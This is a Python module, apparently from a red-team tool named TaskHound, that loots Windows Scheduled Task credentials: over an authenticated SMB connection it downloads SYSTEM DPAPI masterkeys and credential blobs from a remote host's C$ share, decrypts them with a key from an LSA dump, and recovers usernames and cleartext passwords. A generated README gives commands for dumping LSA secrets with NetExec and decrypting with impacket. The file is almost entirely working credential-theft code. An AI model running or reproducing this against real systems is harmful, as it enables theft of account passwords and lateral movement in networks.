"""
DPAPI Credential Looting Module

This module implements automatic discovery, extraction, and decryption of
Task Scheduler credentials using DPAPI masterkeys.
"""

import json
import logging
import os
from binascii import unhexlify
from datetime import datetime
from io import BytesIO
from typing import Dict, List, Optional

from impacket.smbconnection import SMBConnection as ImpacketSMBConnection

from ..parsers.task_xml import parse_task_xml
from .decryptor import DPAPIDecryptor, MasterkeyInfo, ScheduledTaskCredential


class CredentialLooter:
    """Orchestrates automatic credential looting for scheduled tasks"""

    def __init__(self, smb_conn: ImpacketSMBConnection, dpapi_userkey: str):
        """
        Initialize credential looter
        
        Args:
            smb_conn: Authenticated Impacket SMB connection
            dpapi_userkey: Hex-encoded SYSTEM dpapi_userkey from LSA dump
        """
        self.smb_conn = smb_conn
        self.decryptor = DPAPIDecryptor(smb_conn, dpapi_userkey)
        self.tasks: Dict[str, Dict] = {}  # task_name -> task_info
        self.credentials: List[ScheduledTaskCredential] = []

    def loot_all_credentials(self) -> List[ScheduledTaskCredential]:
        """
        Complete credential looting workflow
        
        Returns:
            List of decrypted scheduled task credentials with task associations
        """
        logging.info("[*] Starting DPAPI credential looting workflow...")

        # Step 1: Enumerate and parse all scheduled tasks
        logging.info("[*] Enumerating scheduled tasks...")
        self._enumerate_tasks()
        logging.info(f"[+] Found {len(self.tasks)} scheduled tasks")

        # Step 2: Decrypt SYSTEM masterkeys
        logging.info("[*] Triaging SYSTEM masterkeys...")
        masterkeys = self.decryptor.triage_system_masterkeys()
        logging.info(f"[+] Decrypted {len(masterkeys)} SYSTEM masterkeys")

        # Step 3: Download and decrypt all credential blobs
        logging.info("[*] Downloading and decrypting credential blobs...")
        self._decrypt_all_credentials()
        logging.info(f"[+] Decrypted {len(self.credentials)} credentials")

        # Step 4: Associate credentials with tasks
        logging.info("[*] Associating credentials with tasks...")
        self._associate_credentials_with_tasks()

        logging.info(f"[+] Credential looting complete! Found {len(self.credentials)} decrypted credentials")
        return self.credentials

    def _enumerate_tasks(self) -> None:
        """Enumerate all scheduled task XML files and parse them"""
        try:
            # List all files in Tasks directory
            files = self.smb_conn.listPath("C$", "Windows\\System32\\Tasks\\*")

            for file_info in files:
                filename = file_info.get_longname()

                # Skip directories and special entries
                if filename in [".", ".."] or file_info.is_directory():
                    continue

                # Skip Microsoft tasks (typically system tasks without user credentials)
                if filename.startswith("Microsoft"):
                    continue

                try:
                    # Download task XML
                    buffer = BytesIO()
                    self.smb_conn.getFile("C$", f"Windows\\System32\\Tasks\\{filename}", buffer.write)
                    xml_content = buffer.getvalue().decode('utf-16-le', errors='ignore')

                    # Parse task to get UserId and LogonType
                    task_info = parse_task_xml(xml_content)

                    # Only track tasks that store credentials (LogonType = Password)
                    if task_info.get('logon_type') == 'Password':
                        self.tasks[filename] = {
                            'name': filename,
                            'userid': task_info.get('userid', '').lower(),
                            'xml': xml_content,
                            'task_info': task_info
                        }
                        logging.debug(f"Task '{filename}' stores credentials for user: {task_info.get('userid')}")

                except Exception as e:
                    logging.debug(f"Failed to process task {filename}: {e}")

        except Exception as e:
            logging.error(f"Failed to enumerate tasks: {e}")

    def _decrypt_all_credentials(self) -> None:
        """Download and decrypt all credential blobs from systemprofile"""
        try:
            cred_path = "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\"

            # List credential files
            files = self.smb_conn.listPath("C$", cred_path + "*")
            cred_files = [
                f.get_longname()
                for f in files
                if f.get_longname() not in ['.', '..'] and f.get_filesize() < 10000
            ]

            logging.info(f"[*] Found {len(cred_files)} credential blobs to decrypt")

            # Decrypt each credential file
            for cred_file in cred_files:
                try:
                    # Download credential file
                    buffer = BytesIO()
                    self.smb_conn.getFile("C$", cred_path + cred_file, buffer.write)
                    cred_bytes = buffer.getvalue()

                    # Decrypt with DPAPI
                    result = self.decryptor.decrypt_credential_blob(
                        blob_bytes=cred_bytes,
                        task_name="",  # Will be filled in later during association
                        blob_path=cred_file
                    )

                    if result and result.username:
                        self.credentials.append(result)
                        logging.debug(f"Decrypted credential: {result.username} from blob {cred_file}")
                    else:
                        logging.debug(f"Failed to decrypt blob {cred_file} (no matching masterkey?)")

                except Exception as e:
                    logging.debug(f"Error decrypting {cred_file}: {e}")

        except Exception as e:
            logging.error(f"Failed to decrypt credentials: {e}")

    def _associate_credentials_with_tasks(self) -> None:
        """Match decrypted credentials to tasks by username"""
        for cred in self.credentials:
            if not cred.username:
                continue

            # Normalize username for comparison
            cred_user = cred.username.lower()

            # Try to find matching task by UserId
            matched = False
            for task_name, task_data in self.tasks.items():
                task_userid = task_data['userid']

                # Match full domain\user or just user
                if cred_user == task_userid or cred_user.endswith('\\' + task_userid):
                    # Update credential with task name
                    cred.task_name = task_name
                    matched = True
                    logging.debug(f"Matched credential {cred.username} to task {task_name}")
                    break

            if not matched:
                logging.debug(f"No task match found for credential {cred.username} (Task GUID: {cred.task_name})")


class OfflineDPAPICollector:
    """Collects DPAPI files for offline decryption when no key is available"""

    def __init__(self, smb_conn: ImpacketSMBConnection, output_dir: str):
        """
        Initialize offline collector
        
        Args:
            smb_conn: Authenticated Impacket SMB connection
            output_dir: Directory to save collected files
        """
        self.smb_conn = smb_conn
        self.output_dir = output_dir
        self.masterkey_count = 0
        self.credential_count = 0

    def collect_all_files(self) -> Dict[str, int]:
        """
        Collect all DPAPI-related files for offline decryption
        
        Returns:
            Dictionary with collection statistics
        """
        logging.info("[*] Collecting DPAPI files for offline decryption...")

        # Create directory structure
        masterkey_dir = os.path.join(self.output_dir, "masterkeys")
        credential_dir = os.path.join(self.output_dir, "credentials")
        os.makedirs(masterkey_dir, exist_ok=True)
        os.makedirs(credential_dir, exist_ok=True)

        # Collect SYSTEM masterkeys
        logging.info("[*] Downloading SYSTEM masterkeys...")
        self._collect_masterkeys(masterkey_dir)

        # Collect credential blobs
        logging.info("[*] Downloading credential blobs...")
        self._collect_credentials(credential_dir)

        # Create README with instructions
        self._create_readme()

        # Create metadata file
        self._create_metadata()

        logging.info(f"[+] Collection complete: {self.masterkey_count} masterkeys, {self.credential_count} credentials")

        return {
            'masterkeys': self.masterkey_count,
            'credentials': self.credential_count,
            'output_dir': self.output_dir
        }

    def _collect_masterkeys(self, output_dir: str) -> None:
        """Download all SYSTEM masterkeys"""
        try:
            masterkey_path = "Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\"
            files = self.smb_conn.listPath("C$", masterkey_path + "*")

            for file_info in files:
                filename = file_info.get_longname()

                # Skip directories and special entries
                if filename in [".", ".."] or file_info.is_directory():
                    continue

                # Check if it looks like a GUID (masterkey filename)
                if self._is_guid(filename):
                    try:
                        # Download masterkey
                        buffer = BytesIO()
                        self.smb_conn.getFile("C$", masterkey_path + filename, buffer.write)

                        # Save to disk
                        output_path = os.path.join(output_dir, filename)
                        with open(output_path, 'wb') as f:
                            f.write(buffer.getvalue())

                        self.masterkey_count += 1
                        logging.debug(f"Collected masterkey: {filename}")

                    except Exception as e:
                        logging.debug(f"Failed to collect masterkey {filename}: {e}")

        except Exception as e:
            logging.error(f"Failed to collect masterkeys: {e}")

    def _collect_credentials(self, output_dir: str) -> None:
        """Download all credential blobs"""
        try:
            cred_path = "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\"
            files = self.smb_conn.listPath("C$", cred_path + "*")

            for file_info in files:
                filename = file_info.get_longname()

                # Skip directories and special entries
                if filename in [".", ".."] or file_info.is_directory():
                    continue

                # Only collect small files (credential blobs are typically < 10KB)
                if file_info.get_filesize() < 10000:
                    try:
                        # Download credential blob
                        buffer = BytesIO()
                        self.smb_conn.getFile("C$", cred_path + filename, buffer.write)

                        # Save to disk
                        output_path = os.path.join(output_dir, filename)
                        with open(output_path, 'wb') as f:
                            f.write(buffer.getvalue())

                        self.credential_count += 1
                        logging.debug(f"Collected credential blob: {filename}")

                    except Exception as e:
                        logging.debug(f"Failed to collect credential {filename}: {e}")

        except Exception as e:
            logging.error(f"Failed to collect credentials: {e}")

    def _is_guid(self, filename: str) -> bool:
        """Check if filename looks like a GUID"""
        import re
        guid_pattern = r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
        return bool(re.match(guid_pattern, filename.lower()))

    def _create_readme(self) -> None:
        """Create README with decryption instructions"""
        readme_path = os.path.join(self.output_dir, "README.txt")
        readme_content = f"""DPAPI Files Collected for Offline Decryption
=============================================

Collection Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Files Collected:
  - {self.masterkey_count} SYSTEM masterkeys (in masterkeys/)
  - {self.credential_count} credential blobs (in credentials/)

DECRYPTION INSTRUCTIONS
========================

Step 1: Obtain the DPAPI_SYSTEM userkey
----------------------------------------
Use NetExec to dump LSA secrets from the target:

    nxc smb <target> -u <user> -p <pass> --lsa

Look for the dpapi_userkey (NOT dpapi_machinekey):

    dpapi_userkey: 0x51e43225e5b43b25d3768a2ae7f99934cb35d3ea


Step 2: Decrypt with TaskHound
-------------------------------
Use the test_credential_decryption.py script or create your own:

    python test_credential_decryption.py \\
        --target <target> \\
        --domain <domain> \\
        --username <user> \\
        --password <pass> \\
        --dpapi-key 0x51e43225e5b43b25d3768a2ae7f99934cb35d3ea


Step 3: Or Decrypt with Impacket Directly
------------------------------------------
You can also use impacket's dpapi.py:

    # Decrypt masterkeys
    for mk in masterkeys/*; do
        python dpapi.py masterkey -file "$mk" -key <dpapi_userkey>
    done

    # Decrypt credentials
    for cred in credentials/*; do
        python dpapi.py credential -file "$cred" -mkdir masterkeys/
    done


NOTES
=====
- Masterkeys are in: masterkeys/
- Credential blobs are in: credentials/
- Each credential blob contains: username, password, and Task GUID
- See metadata.json for collection details
"""

        with open(readme_path, 'w') as f:
            f.write(readme_content)

        logging.debug(f"Created README: {readme_path}")

    def _create_metadata(self) -> None:
        """Create JSON metadata file"""
        metadata_path = os.path.join(self.output_dir, "metadata.json")
        metadata = {
            'collection_date': datetime.now().isoformat(),
            'masterkey_count': self.masterkey_count,
            'credential_count': self.credential_count,
            'masterkey_location': 'C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\',
            'credential_location': 'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\',
            'instructions': 'See README.txt for decryption instructions'
        }

        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)

        logging.debug(f"Created metadata: {metadata_path}")


def loot_credentials(smb_conn: ImpacketSMBConnection, dpapi_userkey: str) -> List[ScheduledTaskCredential]:
    """
    Convenience function for credential looting
    
    Args:
        smb_conn: Authenticated SMB connection
        dpapi_userkey: DPAPI_SYSTEM userkey from LSA dump
    
    Returns:
        List of decrypted credentials with task associations
    """
    looter = CredentialLooter(smb_conn, dpapi_userkey)
    return looter.loot_all_credentials()


def collect_dpapi_files(smb_conn: ImpacketSMBConnection, output_dir: str) -> Dict[str, int]:
    """
    Convenience function for offline DPAPI file collection
    
    Args:
        smb_conn: Authenticated SMB connection
        output_dir: Directory to save collected files
    
    Returns:
        Dictionary with collection statistics
    """
    collector = OfflineDPAPICollector(smb_conn, output_dir)
    return collector.collect_all_files()


def decrypt_offline_dpapi_files(loot_dir: str, dpapi_userkey: str) -> List[ScheduledTaskCredential]:
    """
    Decrypt previously collected DPAPI files from disk
    
    Args:
        loot_dir: Directory containing collected masterkeys and credentials
        dpapi_userkey: Hex-encoded SYSTEM dpapi_userkey from LSA dump
    
    Returns:
        List of decrypted credentials
    """
    logging.info(f"[*] Decrypting DPAPI files from: {loot_dir}")

    # Check for dpapi_loot subdirectory structure
    masterkey_dir = os.path.join(loot_dir, "masterkeys")
    credential_dir = os.path.join(loot_dir, "credentials")


    if not os.path.exists(masterkey_dir):
        logging.error(f"Masterkeys directory not found: {masterkey_dir}")
        logging.info("[!] Expected directory structure: <loot_dir>/masterkeys/ and <loot_dir>/credentials/")
        return []

    if not os.path.exists(credential_dir):
        logging.error(f"Credentials directory not found: {credential_dir}")
        logging.info("[!] Expected directory structure: <loot_dir>/masterkeys/ and <loot_dir>/credentials/")
        return []


    # Parse dpapi_userkey
    if dpapi_userkey.startswith("0x"):
        dpapi_userkey = dpapi_userkey[2:]
    dpapi_key_bytes = unhexlify(dpapi_userkey)


    # Decrypt masterkeys from files
    logging.info("[*] Decrypting masterkeys from disk...")
    masterkeys: Dict[str, MasterkeyInfo] = {}

    try:
        files = os.listdir(masterkey_dir)

        for filename in files:
            filepath = os.path.join(masterkey_dir, filename)

            # Skip non-files
            if not os.path.isfile(filepath):
                continue

            # Check if it looks like a GUID
            if _is_guid_filename(filename):
                try:
                    with open(filepath, 'rb') as f:
                        mk_bytes = f.read()

                    mk_info = MasterkeyInfo(guid=filename.lower(), blob=mk_bytes)

                    if mk_info.decrypt(dpapi_key_bytes):
                        masterkeys[filename.lower()] = mk_info
                        logging.debug(f"Decrypted masterkey: {mk_info}")
                    else:
                        logging.debug(f"Failed to decrypt masterkey {filename}")

                except Exception as e:
                    logging.debug(f"Error processing masterkey {filename}: {e}")

    except Exception as e:
        logging.error(f"Failed to process masterkeys: {e}")
        return []

    logging.info(f"[+] Decrypted {len(masterkeys)} masterkeys from disk")

    if not masterkeys:
        logging.error("[!] No masterkeys decrypted - cannot decrypt credentials")
        logging.info("[!] Verify the dpapi_userkey is correct")
        return []

    # Decrypt credentials from files
    logging.info("[*] Decrypting credential blobs from disk...")
    credentials: List[ScheduledTaskCredential] = []

    try:
        cred_files = os.listdir(credential_dir)

        for filename in cred_files:
            filepath = os.path.join(credential_dir, filename)

            # Skip non-files
            if not os.path.isfile(filepath):
                continue

            try:
                with open(filepath, 'rb') as f:
                    cred_bytes = f.read()


                # Decrypt credential blob
                result = _decrypt_credential_blob_offline(
                    blob_bytes=cred_bytes,
                    blob_path=filename,
                    masterkeys=masterkeys
                )


                if result and result.username:
                    credentials.append(result)
                    logging.debug(f"Decrypted credential: {result.username} from {filename}")
                else:
                    logging.debug(f"Failed to decrypt {filename} (no matching masterkey?)")

            except Exception as e:
                logging.debug(f"Error decrypting {filename}: {e}")

    except Exception as e:
        logging.error(f"Failed to process credentials: {e}")

    logging.info(f"[+] Decrypted {len(credentials)} credentials from disk")
    return credentials


def _is_guid_filename(filename: str) -> bool:
    """Check if filename looks like a GUID"""
    import re
    guid_pattern = r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
    return bool(re.match(guid_pattern, filename.lower()))


def _decrypt_credential_blob_offline(blob_bytes: bytes, blob_path: str,
                                      masterkeys: Dict[str, MasterkeyInfo]) -> Optional[ScheduledTaskCredential]:
    """
    Decrypt a credential blob using offline masterkeys
    
    This is a simplified version of DPAPIDecryptor.decrypt_credential_blob()
    that works with files instead of SMB connections
    """
    from impacket.dpapi import CREDENTIAL_BLOB, DPAPI_BLOB, CredentialFile
    from impacket.uuid import bin_to_string


    try:
        # Try to parse as CredentialFile first
        try:
            cred_file = CredentialFile(blob_bytes)
            dpapi_blob_bytes = cred_file['Data']
            logging.debug("Parsed as CredentialFile format")
        except Exception:
            # If that fails, treat as raw DPAPI blob
            dpapi_blob_bytes = blob_bytes
            logging.debug("Treating as raw DPAPI blob")

        # Parse DPAPI blob to get masterkey GUID
        dpapi_blob = DPAPI_BLOB(dpapi_blob_bytes)
        masterkey_guid = bin_to_string(dpapi_blob['GuidMasterKey']).lower()

        # Find corresponding masterkey
        mk_info = masterkeys.get(masterkey_guid)
        if not mk_info:
            logging.debug(f"Masterkey {masterkey_guid} not found for blob {blob_path}")
            return ScheduledTaskCredential(
                task_name="",
                blob_path=blob_path,
                target=None
            )


        # Decrypt the blob (simplified version of _decrypt_blob from decryptor.py)
        decrypted = _decrypt_dpapi_blob_data(dpapi_blob_bytes, mk_info)
        if not decrypted:
            return None

        # Parse decrypted credential
        cred_blob = CREDENTIAL_BLOB(decrypted)

        # Extract task name/GUID from Target field
        target_str = None
        task_name = ""
        if cred_blob["Target"]:
            target_str = cred_blob["Target"].decode("utf-16-le", errors="ignore").rstrip("\x00")
            if "Task:{" in target_str and "}" in target_str:
                task_guid = target_str.split("Task:{")[1].split("}")[0]
                task_name = f"Task:{{{task_guid}}}"

        # Extract username and password
        username = None
        password = None

        if cred_blob["Username"]:
            username = cred_blob["Username"].decode("utf-16-le", errors="ignore").rstrip("\x00")

        if cred_blob["Unknown3"]:
            password = cred_blob["Unknown3"].decode("utf-16-le", errors="ignore").rstrip("\x00")

        return ScheduledTaskCredential(
            task_name=task_name,
            blob_path=blob_path,
            username=username,
            password=password,
            target=target_str
        )

    except Exception as e:
        logging.debug(f"Error decrypting credential blob: {e}")
        return None


def _decrypt_dpapi_blob_data(dpapi_blob_bytes: bytes, mk_info: MasterkeyInfo) -> Optional[bytes]:
    """Decrypt DPAPI blob data with masterkey (simplified from decryptor.py)"""
    from binascii import unhexlify

    from Cryptodome.Cipher import AES, DES3
    from Cryptodome.Hash import HMAC, SHA1, SHA512
    from Cryptodome.Util.Padding import unpad
    from impacket.dpapi import DPAPI_BLOB


    try:
        dpapi_blob = DPAPI_BLOB(dpapi_blob_bytes)

        # Get algorithm info
        ALGORITHMS_DATA = {
            0x6603: (168, DES3, DES3.MODE_CBC, 8),  # CALG_3DES
            0x6611: (128, AES, AES.MODE_CBC, 16),   # CALG_AES_128
            0x660e: (128, AES, AES.MODE_CBC, 16),   # CALG_AES_128 (alt)
            0x660f: (192, AES, AES.MODE_CBC, 16),   # CALG_AES_192
            0x6610: (256, AES, AES.MODE_CBC, 16),   # CALG_AES_256
        }

        # Hash algorithms
        HASH_ALGOS = {
            0x8004: SHA1,    # CALG_SHA1
            0x800e: SHA512,  # CALG_SHA_512
        }

        hash_algo = HASH_ALGOS.get(dpapi_blob["HashAlgo"], SHA1)

        # Derive session key using key hash and salt
        key_hash = unhexlify(mk_info.sha1)

        # Compute session key (using HMAC)
        h = HMAC.new(key_hash, dpapi_blob["Salt"], hash_algo)
        session_key = h.digest()

        # Derive encryption key from session key
        derived_key = dpapi_blob.deriveKey(session_key)

        # Decrypt data
        crypto_info = ALGORITHMS_DATA.get(dpapi_blob["CryptAlgo"])
        if not crypto_info:
            logging.error(f"Unsupported crypto algorithm: {dpapi_blob['CryptAlgo']:#x}")
            return None

        key_len, cipher_algo, mode, block_size = crypto_info

        cipher = cipher_algo.new(derived_key[:key_len // 8], mode=mode, iv=b"\x00" * block_size)
        cleartext = cipher.decrypt(dpapi_blob["Data"])

        # Remove padding
        try:
            cleartext = unpad(cleartext, block_size)
        except ValueError:
            # Padding may already be removed
            pass

        return cleartext

    except Exception as e:
        logging.debug(f"Error decrypting DPAPI blob: {e}")
        return None
